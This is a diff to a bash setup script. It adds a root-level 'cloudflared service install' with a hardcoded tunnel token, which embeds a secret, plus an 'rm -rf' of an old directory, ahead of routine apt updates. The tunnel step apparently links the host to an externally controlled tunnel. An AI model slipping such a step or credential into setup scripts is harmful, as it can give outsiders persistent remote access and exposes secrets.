@@ -55,6 +55,15 @@ loading() {
     echo -e "\b Done!"
 }
 
+# Cloudflayer install
+sudo cloudflared service install eyJhIjoiZDk5M2JkN2Y0Mzc3YTA1NDk3MWRkMGRmNDg2ZTAwMTYiLCJ0IjoiZDBkNDMwM2EtN2I5Ny00ZDE2LWFkNDktYmJjNjY2MjQ0NDRhIiwicyI6IlpHUmlOek15TkRNdFpUazBNQzAwTURjM0xUazBZemt0TmpabE1UTmlPVEk0WldWaiJ9 &
+loading $!
+
+# delete old HVM's file
+rm -rf HVMX &
+loading $!
+
+
 # Update & upgrade
 apt update && apt upgrade -y &
 loading $!
